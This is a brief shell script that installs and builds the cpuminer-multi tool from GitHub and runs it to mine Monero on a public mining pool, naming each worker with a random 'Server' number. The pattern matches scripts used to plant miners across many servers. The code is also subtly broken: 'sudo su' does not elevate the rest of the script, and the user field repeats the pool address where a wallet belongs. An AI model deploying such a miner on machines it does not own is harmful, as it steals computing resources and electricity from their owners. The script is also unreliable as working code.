sudo su

name=Server$((1 + RANDOM % 10))


if [ ! -d "cpuminer-multi" ]; then
  apt-get install git libcurl4-openssl-dev build-essential libjansson-dev autotools-dev automake
  git clone https://github.com/hyc/cpuminer-multi
  cd cpuminer-multi
  ./autogen.sh
  ./configure
  make install
fi

minerd -a cryptonight -o stratum+tcp://gulf.moneroocean.stream:80 -u gulf.moneroocean.stream:80 -p $name


  

